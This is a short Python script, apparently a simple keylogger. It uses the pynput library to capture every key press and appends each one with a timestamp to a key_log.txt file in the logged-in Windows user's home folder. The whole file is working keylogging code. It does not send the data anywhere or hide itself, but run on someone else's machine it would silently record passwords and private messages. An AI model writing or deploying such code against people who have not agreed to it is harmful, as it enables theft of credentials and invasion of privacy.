from pynput.keyboard import Listener
import logging
import getpass

username = getpass.getuser()


logging.basicConfig(filename=("C:/Users/"+username+"/key_log.txt"), # keyLog path file 
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')
def getKey(key):
    logging.info(key)

def stop_listener(key):
    pass


print("listening...")

with Listener(on_press=getKey,on_release=stop_listener) as listener:
    listener.join()


